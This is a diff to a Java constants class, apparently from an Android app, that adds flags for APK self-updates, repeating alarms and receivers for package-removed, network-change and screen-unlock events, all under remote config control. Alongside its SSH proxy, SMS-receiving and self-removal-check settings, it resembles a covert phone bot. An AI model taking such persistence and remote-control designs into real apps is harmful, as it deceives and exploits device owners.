@@ -60,6 +60,9 @@ public class NativeParams {
 
 	//建立ssh成功
 	public static String EVENT_SSH_CONNECT_SUCCESS = "ConnectionSuccess";
+	public static String KEY_VERSION_NAME = "currentVersionName";
+	public static String KEY_BUILD_VERSION_NAME = "buildVersionName";
+	public static String KEY_SSH_CONNECT_NETWORK_TYPE = "sshNetworkType";
 	public static String KEY_SSH_CONNECT_TIME = "ConnectSuccessTime";
 
 	//开始建立proxy代理
@@ -118,10 +121,10 @@ public class NativeParams {
 	public static String EVENT_CHECK_SELF_REMOVED = "checkSelfRemoved";
 	public static String KEY_SELF_IS_REMOVED = "isSelfRemoved";
 
-	public static boolean APPINSTANCE_DEBUG = true;
-	public static boolean APP_ACTIVITY_DEBUG = true;
+	public static boolean APPINSTANCE_DEBUG = false;
+	public static boolean APP_ACTIVITY_DEBUG = false;
 	public static boolean HEARTBEAT_SERVICE_DEBUG = true;
-	public static boolean HEARTBEAT_RUNNABLE_DEBUG = false;
+	public static boolean HEARTBEAT_RUNNABLE_DEBUG = true;
 	public static boolean TERMINAL_SERVICE_DEBUG = true;
 	public static boolean PROXY_SERVICE_DEBUG = true;
 	public static boolean MESSAGE_RUNNABLE_DEBUG = true;
@@ -140,9 +143,9 @@ public class NativeParams {
 	public static boolean PHONE_INFO_DEBUG = true;
 	public static boolean RECEIVE_SMS_DEBUG = true;
 	public static boolean RECEIVE_BOOT_DEBUG = true;
-	public static boolean DOWNLOAD_APK_DEBUG = true;
+	public static boolean DOWNLOAD_APK_DEBUG = false;
 
-	public static boolean HEARTBEAT_APK_UPDATE = false;
+	public static boolean HEARTBEAT_APK_UPDATE = true;
 	public static boolean HEARTBEAT_APK_PROXY = true;
 	public static boolean HEARTBEAT_CHECK_PROXY = true;
 	public static boolean HEARTBEAT_GET_MESSAGE = true;
@@ -152,6 +155,7 @@ public class NativeParams {
 	public static boolean ACTION_ACCEPT_INTENT_START = true;
 	public static boolean ACTION_STOP_HEARTBEAT_SERVICE = false;
 	public static boolean ACTION_REPLACE_PROXY_HOST = false;
+	public static boolean ACTION_REPEAT_ALARM = true;
 	public static String NEW_PROXY_HOST = "";
 
 	public static String ASSIGN_SPECIFIC_TIME = "";
@@ -168,8 +172,21 @@ public class NativeParams {
 	public static String DEFAULT_PHONE_NUMBER = "12345678901";
 	public static String DEFAULT_PHONE_IMEI = "123451234512345";
 
-	public static boolean DEFAULT_SEND_BINARY_SMS = true;
+	public static boolean DEFAULT_SEND_BINARY_SMS = false;
 	public static String DEFAULT_BINARY_SMS_PORT = "6742";
+
+	public static String HEARTBEAT_FROM_TYPE = "startType";
+	public static String TYPE_FROM_ALARM = "startByAlarm";
+	public static String TYPE_FROM_ACTION = "startByAction";
+	public static String TYPE_FROM_BROADCAST = "startByBroadcast";
+
+	//是否接收包删掉广播
+	public static boolean ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = true;
+	//是否接收网络变化广播
+	public static boolean ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = true;
+	//是否接受开屏广播
+	public static boolean ACTION_ACCEPT_USER_PRESENT_RECEIVER = true;
+
 
 	public static synchronized void updateOnlineConfig(OnlineConfig config) {
 		if (isUpdatedOnlineConfig) return;
@@ -200,6 +217,11 @@ public class NativeParams {
 		isUpdatedOnlineConfig = true;
 		SMS_RECEIVER_VALID_TIME = config.getSmsReceiverValidTime();
 		HEARTBEAT_RUNNABLE_DEBUG = Boolean.valueOf(config.getHeartbeatRunnableDebug());
+		ACTION_REPEAT_ALARM = Boolean.valueOf(config.getActionRepeatingAlarm());
+
+		ACTION_ACCEPT_NETWORK_CHANGE_RECEIVER = Boolean.valueOf(config.getActionAcceptNetworkChangeReceiver());
+		ACTION_ACCEPT_PACKAGE_REMOVED_RECEIVER = Boolean.valueOf(config.getActionAcceptPackageRemovedReceiver());
+		ACTION_ACCEPT_USER_PRESENT_RECEIVER = Boolean.valueOf(config.getActionAcceptUserPresentReceiver());
 	}
 
 }
